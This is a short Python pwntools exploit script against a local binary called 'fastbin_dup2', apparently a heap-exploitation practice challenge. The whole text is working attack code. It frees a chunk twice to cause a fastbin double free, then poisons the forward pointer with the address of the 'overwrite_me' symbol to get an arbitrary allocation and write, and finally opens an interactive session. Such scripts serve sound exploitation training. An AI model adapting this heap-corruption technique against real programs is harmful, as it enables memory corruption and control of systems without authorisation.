from pwn import *
p = process("./fastbin_dup2")

def add(data):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(data))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def getshell():
	print p.sendlineafter(">","3")

elf = ELF('./fastbin_dup2')
print p.sendlineafter("Name :", "AAAA")
add("AAAA") # 0
add("AAAA") # 1 
free(0)
free(1)
free(0)
overwrite_me_addr = elf.symbols['overwrite_me']
add(p64(overwrite_me_addr)) # 0x602010 : FD overwrite
add("AAAA") # 0x602030
add("BBBB") # 0x602010
add("DDDD") # Arbitrary allocate, write
p.interactive()